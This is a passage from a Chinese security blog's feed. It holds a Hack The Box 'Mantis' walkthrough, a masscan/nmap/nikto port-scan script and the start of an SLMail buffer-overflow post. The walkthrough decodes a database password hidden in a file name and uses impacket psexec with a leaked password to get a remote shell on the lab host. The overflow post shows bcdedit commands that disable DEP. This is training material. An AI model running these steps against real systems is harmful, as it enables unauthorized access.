class="hljs-selector-attr">[-d 目标IP/网域]</span> -j <span class="hljs-selector-attr">[ACCEPT|DROP|REJECT|LOG]</span><br><br></code></pre></div></td></tr></table></figure><h2 id="案例介绍"><a href="#案例介绍" class="headerlink" title="案例介绍"></a>案例介绍</h2><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp --destination-port <span class="hljs-number">13327</span> \! -d <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -j DROP<br><br>-<span class="hljs-selector-tag">A</span> 新增一条<span class="hljs-selector-tag">INPUT</span>输入规则<br>-<span class="hljs-selector-tag">p</span> 指定协议为tcp的数据包<br>--destination-port 指定连接端口为<span class="hljs-number">13327</span><br>-d <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    指定IP为<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>加上！的意思是不允许——指定IP不是<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>的<br>-j DROP 符合上述条件的数据包，丢弃这些数据包<br></code></pre></div></td></tr></table></figure><h2 id="查看已有规则"><a href="#查看已有规则" class="headerlink" title="查看已有规则"></a>查看已有规则</h2><p>iptables-save</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mantis（敏感信息泄露+445端口连接）</title>
    <link href="/2020/01/21/12-x/"/>
    <url>/2020/01/21/12-x/</url>
    
    <content type="html"><![CDATA[<h2 id="10-10-10-52"><a href="#10-10-10-52" class="headerlink" title="10.10.10.52"></a>10.10.10.52</h2><p><a href="https://whale3070.github.io/scan/2020/01/17/06-x/">使用脚本扫描端口</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-21-12/1.PNG" alt="1"></p><p>cat 10.10.10.52.txt</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-21-12/2.PNG" alt="2"></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>   <span class="hljs-string">domain</span>       <span class="hljs-string">Microsoft</span> <span class="hljs-string">DNS</span> <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span> <span class="hljs-string">(1DB15CD4)</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span> <span class="hljs-string">SP1)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">dns-nsid:</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">bind.version:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">DNS</span> <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span> <span class="hljs-string">(1DB15CD4)</span><br><span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>   <span class="hljs-string">kerberos-sec</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2020-01-17 11:19:45Z</span><span class="hljs-string">)</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">htb.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span> <span class="hljs-string">Standard</span> <span class="hljs-number">7601 </span><span class="hljs-string">Service</span> <span class="hljs-string">Pack</span> <span class="hljs-number">1</span> <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">HTB)</span><br><span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">kpasswd5?</span><br><span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>   <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">1337</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">IIS</span> <span class="hljs-string">httpd</span> <span class="hljs-number">7.5</span><br><span class="hljs-string">|</span> <span class="hljs-attr">http-methods:</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">Potentially risky methods:</span> <span class="hljs-string">TRACE</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-IIS/7.5</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">IIS7</span><br><span class="hljs-number">1433</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">ms-sql-s</span>     <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2014 </span><span class="hljs-number">12.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span><span class="hljs-string">;</span> <span class="hljs-string">RTM</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-ntlm-info:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Target_Name:</span> <span class="hljs-string">HTB</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS_Domain_Name:</span> <span class="hljs-string">HTB</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS_Computer_Name:</span> <span class="hljs-string">MANTIS</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Domain_Name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Computer_Name:</span> <span class="hljs-string">mantis.htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Tree_Name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">Product_Version:</span> <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=SSL_Self_Signed_Fallback</span><br><span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2020-01-17T09:04:27</span><br><span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2050-01-17T09:04:27</span><br><span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2020-01-17T11:20:51+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+31s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">htb.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">8080</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-open-proxy:</span> <span class="hljs-string">Proxy</span> <span class="hljs-string">might</span> <span class="hljs-string">be</span> <span class="hljs-string">redirecting</span> <span class="hljs-string">requests</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-IIS/7.5</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Tossed</span> <span class="hljs-string">Salad</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Blog</span><br><span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>   <span class="hljs-string">mc-nmf</span>       <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span><br><span class="hljs-number">47001</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>   <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">49157</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>   <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">50255</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>   <span class="hljs-string">ms-sql-s</span>     <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2014 </span><span class="hljs-number">12.00</span><span class="hljs-number">.2000</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-ntlm-info:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Target_Name:</span> <span class="hljs-string">HTB</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS_Domain_Name:</span> <span class="hljs-string">HTB</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS_Computer_Name:</span> <span class="hljs-string">MANTIS</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Domain_Name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Computer_Name:</span> <span class="hljs-string">mantis.htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">DNS_Tree_Name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">Product_Version:</span> <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=SSL_Self_Signed_Fallback</span><br><span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2020-01-17T09:04:27</span><br><span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2050-01-17T09:04:27</span><br><span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2020-01-17T11:20:51+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+31s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">MANTIS;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows_server_2008:r2:sp1,</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">43m22s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">1h53m23s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">30s</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-info:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">10.10.10.52:1433:</span><br><span class="hljs-string">|</span>     <span class="hljs-attr">Version:</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">name:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2014 </span><span class="hljs-string">RTM</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">number:</span> <span class="hljs-number">12.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">Product:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2014</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">Service pack level:</span> <span class="hljs-string">RTM</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">Post-SP patches applied:</span> <span class="hljs-literal">false</span><br><span class="hljs-string">|_</span>    <span class="hljs-attr">TCP port:</span> <span class="hljs-number">1433</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span> <span class="hljs-string">Standard</span> <span class="hljs-number">7601 </span><span class="hljs-string">Service</span> <span class="hljs-string">Pack</span> <span class="hljs-number">1</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span> <span class="hljs-string">Standard</span> <span class="hljs-number">6.1</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">mantis</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">MANTIS\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Forest name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">mantis.htb.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2020-01-17T06:20:42-05:00</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">&lt;blank&gt;</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">2.02:</span><br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2020-01-17T11:20:43</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-number">2020-01-17T09:04:01</span><br><br></code></pre></div></td></tr></table></figure><p>操作系统：<br>445端口<br><code>Windows Server 2008 R2 Standard 7601 Service</code></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a href="https://whale3070.github.io/scan/2019/07/31/11-x/">使用脚本扫描web目录</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>:<span class="hljs-number">1337</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>:<span class="hljs-number">593</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/Users/</span>Account/LogOn?ReturnUrl=%<span class="hljs-number">2</span>F<br>```   <br><br>![<span class="hljs-number">5</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">5</span>.PNG)<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>:<span class="hljs-number">1337</span>/secure_notes<br>![<span class="hljs-number">6</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">6</span>.PNG)<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>:<span class="hljs-number">1337</span><span class="hljs-regexp">/secure_notes/</span>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt<br><br>![<span class="hljs-number">7</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">7</span>.PNG)<br>从文件内容可以得知用户名、数据库名<br><br>文件名包含一串密文`NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx`<br><br>`echo -n NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d`<br><br>将其base64解码以后，得到`<span class="hljs-number">6</span>d2424716c5f53405f504073735730726421`<br><br>`echo -n <span class="hljs-number">6</span>d2424716c5f53405f504073735730726421 | wc -c`<br>查看密文的长度，是<span class="hljs-number">36</span>位。如果密文长度是<span class="hljs-number">32</span>位，说明可能是MD5加密。<br><br>`echo -n <span class="hljs-number">6</span>d2424716c5f53405f504073735730726421 | xxd -ps -r`将其<span class="hljs-number">16</span>进制解码就可以得到我们的密码`m$<span class="hljs-variable">$ql_S</span>@_P@ssW0rd!`<br><br><span class="hljs-comment">## 十六进制与xxd</span><br>xxd是十六进制转储工具<br><br>使用方法：`xxd 文件名`<br><br>![<span class="hljs-number">8</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">8</span>.PNG)<br><br><span class="hljs-comment">## 连接数据库</span><br>dbeaver 是一个通用数据库，使用该客户端，连接目标机器的数据库。<br><br>注意之前的扫描结果，mssql版本： Microsoft SQL Server <span class="hljs-number">2014</span> <span class="hljs-number">12.00</span>.<span class="hljs-number">2000</span><br>![<span class="hljs-number">9</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">9</span>.PNG)<br><br><br><br></code></pre></div></td></tr></table></figure><p>地址：10.10.10.52<br>数据库名：orcharddb<br>用户名： admin<br>密码：m$$ql_S@_P@ssW0rd!</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><br>下载驱动，然后点测试连接。<br>![<span class="hljs-number">10</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">10</span>.PNG)<br><br><br>![<span class="hljs-number">11</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">11</span>.PNG)<br><br><br></code></pre></div></td></tr></table></figure><p>locate psexec.py<br>python /usr/share/doc/python-impacket/examples/psexec.py htb.local/James@10.10.10.52 cmd.exe<br>J@m3s_P@ssW0rd!</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> psexec 是一个类似于telnet的连接软件，通过psexec连接<span class="hljs-number">445</span>端口。<br>![<span class="hljs-number">12</span>](https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<span class="hljs-regexp">/master/img</span><span class="hljs-regexp">/01-21-12/</span><span class="hljs-number">12</span>.PNG)<br><br></code></pre></div></td></tr></table></figure><p>cd C:\users\Adminitrator<br>cd C:\users\Administrator\Desktop<br>type root.txt</p><div class="hljs code-wrapper"><pre><code>## 总结- 学习了psexec的用法- 一条命令，关闭进程`pgrep openvpn | xargs kill -s 9`- msf 有psexec模块，可以输入明文密码，也可以输入hash作为密码。</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个快速全端口扫描的bash脚本</title>
    <link href="/2020/01/17/06-x/"/>
    <url>/2020/01/17/06-x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mass.sh">#!/bin/bash<br><br>read -p &quot;which ip? &quot; ip<br>masscan -p1-65535,U:1-65535 $&#123;ip&#125; --rate=1000 -p1-65535,U:1-65535 -e tun0 &gt; ports  #修改这里的网卡名称tun0为你自己的联网的网卡<br><br>what=$(awk &#x27;NR&lt;=1 &#123;print $6&#125;&#x27; ports)<br>ports=$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;/&quot; &#x27;&#123;print $1&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br>nmap -Pn -sV -sC -p$ports $&#123;what&#125; -oA $&#123;ip&#125;<br>nmap -Pn -sU -sV -sC -p$ports $&#123;what&#125; -oA $&#123;ip&#125;-udp.xml<br>cat $&#123;ip&#125;.nmap | grep -v &#x27;closed&#x27; | grep -v &#x27;msrpc&#x27; | grep -v &#x27;tcpwrapped&#x27; &gt; $&#123;ip&#125;.txt<br>nikto -h http://$&#123;ip&#125; &gt; nikto-$&#123;ip&#125;.txt<br></code></pre></div></td></tr></table></figure><p>全端口扫描+开启端口版本识别，也就3分钟出头。而如果使用nmap全端口扫描，至少几个小时吧。。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-17-06/1.PNG" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>scan</category>
      
    </categories>
    
    
    <tags>
      
      <tag>scan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>slmail&amp;windows缓冲区溢出案例（二）</title>
    <link href="/2020/01/15/03-x/"/>
    <url>/2020/01/15/03-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/">https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/</a></p><h2 id="准备一个虚拟机"><a href="#准备一个虚拟机" class="headerlink" title="准备一个虚拟机"></a>准备一个虚拟机</h2><p>windows server 2008，安装好slmail、python环境、immunity debugger</p><p>然后将开始调试之前，生成一个快照。该虚拟机环境可下载，购买<a href="https://market.m.taobao.com/app/idleFish-F2e/widle-taobao-rax/page-detail?wh_weex=true&wx_navbar_transparent=true&id=611018864927&ut_sk=1.W8/lRTdqkP8DAINtC46VjcuH_12431167_1579074460376.Copy.detail.611018864927.2609790715&forceFlush=1">点我</a></p><h2 id="关闭DEP保护"><a href="#关闭DEP保护" class="headerlink" title="关闭DEP保护"></a>关闭DEP保护</h2><p> 我们在命令提示符下运行不带有任何参数的bcdedit命令，可以看到当前的启动配置，如图所示显示了在Windows下运行bcdedit的结果，其中最后一行显示nx OptIn，表示当前的DEP保护级别为1，如果显示为<strong>OptOut则表示当前的EDP保护级别为2</strong>。如果我们要关闭EDP，只需将nx设置为Always0ff即可。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">bcdedit<br>bcdedit /<span class="hljs-builtin-name">set</span> nx alwaysoff     关闭DEP保护<br>bcdedit /<span class="hljs-builtin-name">set</span> nx alwayson      开启DEP保护<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/2.PNG" alt="2"></p><h2 id="检查坏字符"><a href="#检查坏字符" class="headerlink" 